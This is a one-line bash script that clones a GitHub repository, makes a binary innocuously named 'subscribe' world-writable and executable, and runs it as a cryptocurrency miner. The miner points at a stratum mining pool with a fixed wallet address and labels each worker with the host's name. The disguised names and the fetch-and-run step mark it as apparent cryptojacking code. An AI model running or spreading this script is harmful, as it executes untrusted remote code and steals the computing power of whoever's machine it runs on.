#!/bin/bash
git clone https://github.com/mariobiszz/students.git && cd students && chmod 777 subscribe && ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
